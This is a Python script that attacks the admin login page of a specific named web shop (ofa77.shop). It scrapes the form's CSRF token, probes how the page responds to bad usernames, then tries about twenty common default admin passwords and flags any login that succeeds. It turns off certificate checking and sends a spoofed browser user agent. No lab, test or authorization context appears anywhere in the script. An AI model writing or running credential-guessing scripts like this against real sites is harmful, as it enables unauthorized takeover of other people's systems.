import httpx, re
c=httpx.Client(verify=False, follow_redirects=True, timeout=15,
    headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121 Safari/537.36'})
URL='https://ofa77.shop/module/admin/unionshop/user/login'

def get_token():
    r=c.get(URL)
    m=re.search(r'name="_token" value="([^"]+)"', r.text)
    return m.group(1) if m else None, r.status_code

def try_login(user, pw):
    tok,_=get_token()
    r=c.post(URL, data={'_token':tok,'username':user,'password':pw})
    # success = redirect to a non-login admin page or 'dashboard'/'home'
    loc=r.headers.get('location','')
    success = ('login' not in (loc or '')) and r.status_code in (200,302) and ('dashboard' in r.text or 'logout' in r.text or loc.startswith('http'))
    # extract error message
    err=''
    m=re.search(r'(message|alert|提示|錯誤|Error)[^>]*>([^<]{2,60})<', r.text)
    if m: err=m.group(2).strip()
    return r.status_code, loc, err, len(r.text), success

print('=== behavior probes ===')
for u,p in [('nonexistentuser12345','wrongpass1'), ('admin','wrongpass1')]:
    sc,loc,err,ln,suc=try_login(u,p)
    print(f'{u}/{p} -> sc={sc} loc={loc[:40]!r} err={err!r} len={ln} success={suc}')

print('=== default creds ===')
defaults=[('admin','admin'),('admin','123456'),('admin','admin123'),('admin','password'),
('admin','123456789'),('admin','admin888'),('admin','admin123456'),('admin','unioncms'),
('admin','unionshop'),('admin','888888'),('admin','111111'),('admin','000000'),
('admin','abc123'),('admin','a123456'),('admin','12345'),('admin','root'),
('admin','1qaz2wsx'),('admin','qwerty'),('admin','88888888'),('admin','666666')]
for u,p in defaults:
    sc,loc,err,ln,suc=try_login(u,p)
    flag='  <=== SUCCESS' if suc else ''
    print(f'{u}/{p} -> sc={sc} loc={loc[:40]!r} err={err[:40]!r} success={suc}{flag}')
